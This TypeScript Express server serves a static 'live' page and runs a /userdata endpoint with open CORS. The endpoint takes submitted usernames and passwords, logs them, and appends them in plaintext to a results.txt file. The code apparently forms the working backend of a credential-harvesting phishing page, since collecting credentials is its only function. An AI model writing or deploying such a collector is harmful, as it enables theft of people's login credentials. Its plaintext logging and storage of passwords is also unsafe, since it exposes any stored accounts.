import express, { Request, Response } from "express";
import fs from "fs";
import cors from 'cors';
import path from 'path';

const app = express();
app.use(cors());

app.use(express.json()); // Change this to parse JSON instead of urlencoded data
app.use(express.urlencoded({ extended: false }));

// Determine the root directory
const rootDir = path.resolve(__dirname, '..');

// Adjust the public path
const publicPath = path.join(rootDir, 'src', 'public', 'live');

// Check if the directory exists
if (!fs.existsSync(publicPath)) {
    console.error(`Public directory not found: ${publicPath}`);
    console.log('Current directory:', process.cwd());
    console.log('__dirname:', __dirname);
    process.exit(1);
}

app.use(express.static(publicPath));

app.get("/live", (req: Request, res: Response) => {
    const indexPath = path.join(publicPath, "index.html");
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        res.status(404).send("index.html not found");
    }
});

app.post("/userdata", (req: Request, res: Response) => {
    try {
        const { userName, password } = req.body;
        const data = `${userName}:${password}\n`;
        console.log('Received data:', data); // Add this for debugging
        const resultPath = path.join(__dirname, "..", "results.txt");
        fs.appendFile(resultPath, data, (err) => {
            if (err) {
                console.error("Error writing to file:", err);
                res.status(500).send("Error writing to file");
            } else {
                console.log("Successfully written to file.");
                res.status(200).send("Data received and saved");
            }
        });
    } catch(err) {
        console.error("Error processing request:", err);
        res.status(500).send("Server error");
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Serving static files from: ${publicPath}`);
});